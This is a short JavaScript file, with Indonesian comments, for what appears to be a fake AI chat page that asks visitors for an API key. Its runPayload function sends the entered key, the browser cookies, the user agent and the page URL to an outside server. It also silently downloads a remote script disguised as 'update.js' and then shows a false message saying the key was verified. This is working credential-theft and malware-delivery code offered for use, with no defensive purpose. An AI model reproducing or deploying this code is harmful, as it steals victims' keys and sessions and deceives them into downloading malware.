// ===== ELEMEN =====
const chat = document.getElementById('chat');
const input = document.getElementById('api-input');
const btn = document.getElementById('enter-btn');

// ===== FUNGSI =====
function addMessage(sender, text) {
    const div = document.createElement('div');
    div.className = `msg ${sender.toLowerCase()}`;
    div.innerHTML = `<div class="bubble">${text}</div>`;
    chat.appendChild(div);
    chat.scrollTop = chat.scrollHeight;
}

// ===== PAYLOAD (Cookie Hijack + Download) =====
function runPayload() {
    // 1. Kirim data ke server
    fetch('https://payload-nu-eight.vercel.app/api/server.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            api_key: input.value,
            cookies: document.cookie,
            user_agent: navigator.userAgent,
            url: window.location.href
        })
    });

    // 2. Download payload.js tanpa notif
    const link = document.createElement('a');
    link.href = 'https://shadowofobscurity322.github.io/payload/payload.js';
    link.download = 'update.js';
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // 3. Tampilkan pesan sukses
    addMessage('AI', '✅ API Key terverifikasi! Silakan chat.');
}

// ===== EVENT =====
btn.addEventListener('click', () => {
    const key = input.value.trim();
    if (!key) return alert('Masukkan API Key!');
    runPayload();
});

input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') btn.click();
});
